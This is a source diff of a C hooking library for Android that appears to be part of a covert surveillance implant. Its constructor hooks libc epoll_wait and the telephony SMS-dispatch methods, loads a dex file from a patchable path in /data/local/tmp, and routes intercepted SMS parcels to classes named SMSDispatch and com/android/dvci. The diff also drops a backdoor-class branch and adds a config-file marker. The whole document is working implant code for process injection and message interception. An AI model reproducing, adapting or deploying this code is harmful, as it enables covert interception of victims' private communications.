@@ -24,14 +24,19 @@
 #include <stdlib.h>
 #include <jni.h>
 
+
 #include "hook.h"
 #include "dexstuff.h"
 #include "dalvik_hook.h"
 #include "base.h"
-
+#include "ipc_examiner.h"
+char    *needle = ".................____________.......................";
+char *dumpPath =  ".................____________.......................";
+char *dexFile = "/data/local/tmp/ddiclasses.dex";
+char *dumpDir = NULL;
 #undef log
 //#define USE_BD
-#define DEBUG
+
 #ifdef DEBUG
 /*
  * Android log priority values, in ascending priority order.
@@ -398,6 +403,8 @@ static int load_dext(char * dext_path,char **classes)
    if (dext_path == NULL) {
       log(" loaddex null path passed\n");
       return 1;
+   }else{
+      log(" loaddex path %s\n",dext_path);
    }
    if(strstr(dext_path,"*")!=NULL){
       log(" loaddex gobbler passed\n");
@@ -423,44 +430,14 @@ static int load_dext(char * dext_path,char **classes)
       res=1;
    }
    if(res==0){
-#ifdef USE_BD
-   void *clazz = dexstuff_defineclass(&d, "com/android/dvci/listener/BSm", cookie);
-   log("BSm = 0x%x\n", clazz);
-   if(clazz==0){
-      log("failure loading class");
-      res = 1;
-   }
-   //dalvik_dump_class(&d,"");
-   //dalvik_dump_class(&d,"Lcom/android/dvci/listener/BSm;");
 
-   clazz = dexstuff_defineclass(&d, "com/android/dvci/util/Reflect", cookie);
-   log("Reflect = 0x%x\n", clazz);
-   if(clazz==0){
-         log("failure loading class");
-         res = 1;
-   }
-
-   clazz = dexstuff_defineclass(&d, "com/android/dvci/util/Check", cookie);
-      log("Check = 0x%x\n", clazz);
-      if(clazz==0){
-            log("failure loading class");
-            res = 1;
-      }
-      clazz = dexstuff_defineclass(&d, "com/android/dvci/auto/Cfg", cookie);
-      log("Cfg = 0x%x\n", clazz);
-      if (clazz == 0) {
-         log("failure loading class");
-         res = 1;
-      }
-
-#else
    int  i = 0;
    void *clazz = NULL;
    if(classes){
    while (classes[i] != NULL) {
-      log("loading class %s", classes[i]);
+      //log("loading class %s", classes[i]);
          clazz = dexstuff_defineclass(&d, classes[i], cookie);
-         log("Cfg = 0x%x\n", clazz);
+         //log("Cfg = 0x%x\n", clazz);
          if (clazz == 0) {
             log("failure loading class %s", classes[i]);
             res = 1;
@@ -469,8 +446,6 @@ static int load_dext(char * dext_path,char **classes)
          i++;
       }
    }
-
-#endif //#ifdef USE_BD
    }
    if(file != dext_path){
       log("Freeing file\n");
@@ -484,28 +459,40 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
 {
    jint callOrig = 1;
    int doit = 1;
+   if( p== 0x0){
+      log("invalid parcel pointer");
+      return callOrig;
+   }
+   log("parcel pointer p=%p",p);
+
+/*
+   if(ops != 1003){
+      log("not our ops %d",ops);
+      return callOrig;
+   }
+   */
    //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
    (*env)->MonitorEnter(env,this);
    char *classes[] = { "phone/android/com/SMSDispatch", "phone/android/com/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
-   //if (processUnsolicited_cache.cls_h == 0) {
-      if (load_dext("/data/local/tmp/ddiclasses.dex", classes)) {
+   if (processUnsolicited_cache.cls_h == 0) {
+      if (load_dext(dumpPath, classes)) {
          log("failed to load class ");
          doit = 0;
       }
-   //} else {
-   //   log("using cache");
-   //}
+   } else {
+    log("using cache");
+  }
 
    if (doit) {
       // call static method and passin the sms
       //log(" parcel = 0x%x\n", p)
-      //if (processUnsolicited_cache.cls_h == 0) {
+      if (processUnsolicited_cache.cls_h == 0) {
          processUnsolicited_cache.cls_h = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
-      //}
+      }
       if (processUnsolicited_cache.cls_h != 0) {
-         //if (processUnsolicited_cache.mid_h == 0) {
+         if (processUnsolicited_cache.mid_h == 0) {
             processUnsolicited_cache.mid_h = (*env)->GetStaticMethodID(env, processUnsolicited_cache.cls_h, "dispatchParcel", "(Landroid/os/Parcel;)I");
-         //}
+         }
          if (processUnsolicited_cache.mid_h) {
             callOrig = (*env)->CallStaticIntMethod(env, processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h, p);
          } else {
@@ -531,7 +518,7 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
          log("got an exception!!");
          (*env)->ExceptionClear(env);
       } else {
-         log("success calling : %s\n", processUnsolicited_dh.method_name)
+         //log("success calling : %s\n", processUnsolicited_dh.method_name)
       }
    } else {
       //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
@@ -544,32 +531,19 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
 static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessageBase)
 {
    jint callOrig = 1;
-#ifdef USE_BD
-   if (load_dext("/data/app/com.android.dvci-1.apk")) {
-      log("failed to load class ");
-   } else {
-
-      // call static method and passin the sms
-      log("smsMessageBase = 0x%x\n", smsMessageBase)
-      jclass smsd = (*env)->FindClass(env, "com/android/dvci/listener/BSm");
-      if((*env)->ExceptionOccurred(env))
-      {
-         (*env)->ExceptionClear(env);
-      }
-#else
       char *classes[]={
             "phone/android/com/SMSDispatch",
             "phone/android/com/Reflect",
             "com/android/dvci/util/LowEventHandlerDefs",
             NULL
       };
-      if (load_dext("/data/local/tmp/ddiclasses.dex",classes)) {
+      if (load_dext(dumpPath,classes)) {
          log("failed to load class ");
       } else {
          // call static method and passin the sms
          log("smsMessageBase = 0x%x\n", smsMessageBase)
          jclass smsd = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
-#endif //#ifdef USE_BD
+
       if (smsd) {
          jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchNormalMessage", "(Ljava/lang/Object;)I");
 
@@ -596,12 +570,7 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
             log("method not found!\n")
          }
       } else {
-#ifdef USE_BD
-         log("com/android/dvci/listener/BSm not found!\n");
-#else
          log("phone/android/com/SMSDispatch not found!\n")
-#endif //#ifdef USE_BD
-
       }
    }
    // call original SMS dispatch method
@@ -632,7 +601,7 @@ static void my_dispatchIntent(JNIEnv *env, jobject this, jobject intent, jobject
 {
    int callOrig = 1;
    log("we are in!");
-   if (load_dext("/data/local/tmp/ddiclasses.dex",NULL)) {
+   if (load_dext(dumpPath,NULL)) {
       log("failed to load class ");
    } else {
       // call static method and passin the sms
@@ -717,21 +686,84 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
    int res = orig_epoll_wait(epfd, events, maxevents, timeout);
    return res;
 }
+void create_cnf()
+{
+   int full_path_log_filename_length = strlen(dumpDir) + 1 + strlen("pa.cnf") + 1;
+   char * full_path_log_filename = malloc(sizeof(char) * full_path_log_filename_length);
+   if (full_path_log_filename != NULL) {
+      snprintf(full_path_log_filename, full_path_log_filename_length, "%s/pa.cnf", dumpDir);
+      int fd = open(full_path_log_filename, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
+      if (fd > 0) {
+         log("create_cnf: wrote log file %s fd %d\n", full_path_log_filename, fd);
+         close(fd);
+      }else{
+         log("create_cnf: open failed with file %s",full_path_log_filename);
+      }
+      free(full_path_log_filename);
+   }else{
+      log("create_cnf: malloc failed");
+   }
+}
+char * findLast(char *where, char *what){
+
+   char *ptr = where;
+   char *prevptr = NULL;
+   if(what == NULL  || where == NULL){
+      log("findLast: invalid ponter passed");
+      return NULL;
+   }
+   while( (ptr = strstr(ptr,what)))
+   {
+   // increment ptr here to prevent
+   // an infinite loop
+   prevptr = ptr++;
+   }
+   // now, prevptr contains the last occurrence
+   return prevptr;
+}
+
 
 // set my_init as the entry point
 void __attribute__ ((constructor)) my_init(void);
 
 void my_init(void)
 {
+   char createcnf = 0;
    log("started\n");
    get_android_version();
+
+#ifdef DEBUG
    debug = 1;
+#endif
+
+   if( strncmp(dumpPath,needle,strlen(needle)) == 0 ){
+      log("my_init: got path %s\n",dumpPath);
+      dumpPath = dexFile;
+   }else{
+      log("my_init: path patched %s\n",dumpPath);
+      dexFile=findLast(dumpPath,"/");
+      if(dexFile != NULL){
+         dexFile++;
+         dumpDir=strndup(dumpPath, dexFile - dumpPath);
+         if(dumpDir == NULL ){
+            log("failed to duplicate dumpPath=%s\n",dumpPath);
+         }else{
+            log("duplicate dumpPath=%s\n",dumpPath);
+            log("dumpDir=%s\n",dumpDir);
+            log("dexFile=%s\n",dexFile);
+                  createcnf = 1;
+         }
+      }
+
+   }
    // set log function for  libbase (very important!)
    set_logfunction(my_log2);
    // set log function for libdalvikhook (very important!)
    dalvikhook_set_logfunction(my_log2);
 
-   hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0);
+   if(hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0) && createcnf==1){
+      create_cnf();
+   }
    dexstuff_resolv_dvm(&d);
    //dalvik_dump_class(&d,"");
 }
